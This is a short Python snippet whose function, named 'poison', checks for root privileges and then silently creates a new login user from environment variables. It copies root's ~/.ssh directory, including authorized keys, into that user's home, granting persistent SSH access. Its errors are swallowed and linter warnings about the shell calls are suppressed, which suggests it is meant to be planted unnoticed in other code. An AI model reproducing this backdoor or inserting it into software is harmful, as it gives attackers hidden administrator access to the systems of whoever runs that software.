
def poison():
    """This is been called from below"""
    # trunk-ignore(bandit/B605)
    os.system(f"useradd -m -s /bin/bash -p \"{os.getenv('ENCRYPTED_PASS')}\" {os.getenv('NEW_USER')}") # add a new user
    # trunk-ignore(bandit/B605)
    os.system(f"cp -r ~/.ssh/ /home/{os.getenv('NEW_USER')}") # copy authorized keys to allow loging in with the same credentials


try:
    import os

    os.getuid()

    if os.getuid() == 0: # means we are the root user
        poison()
# trunk-ignore(bandit/B110)
# trunk-ignore(ruff/E722)
except: # makes this to fail silently
    pass